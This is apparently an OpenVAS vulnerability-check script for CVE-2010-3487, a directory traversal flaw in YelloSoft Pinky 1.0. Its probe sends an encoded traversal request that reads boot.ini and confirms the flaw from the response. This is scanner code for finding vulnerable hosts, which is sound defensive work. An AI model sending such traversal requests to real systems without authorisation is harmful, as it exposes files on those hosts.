###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_yellosoft_pinky_dir_trav_vuln_win.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# YelloSoft Pinky Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902253");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-3487");
  script_name("YelloSoft Pinky Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/41538");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1009-exploits/pinky10-traversal.txt");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/Pinky.1.0.Directory.Traversal/42");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 2323);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to gain information
about directory and file locations.");
  script_tag(name:"affected", value:"Yellosoft pinky version 1.0 and prior on windows.");
  script_tag(name:"insight", value:"Input passed via the URL is not properly verified before being
 used to read files. This can be exploited to download arbitrary files via
directory traversal attacks.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running YelloSoft Pinky and is prone to Directory
Traversal vulnerability.");
  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

ysPort = get_http_port( default:2323 );

rcvRes = http_get_cache(item:string("/index.html"), port:ysPort);

if("<title>Pinky</title" >< rcvRes && ">YelloSoft<" >< rcvRes)
{
  request = http_get(item:"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C.." +
                          "/%5C../%5C../boot.ini", port:ysPort);
  response = http_keepalive_send_recv(port:ysPort, data:request);

  if(("\WINDOWS" >< response) && ("boot loader" >< response)){
      security_message(ysPort);
  }
}
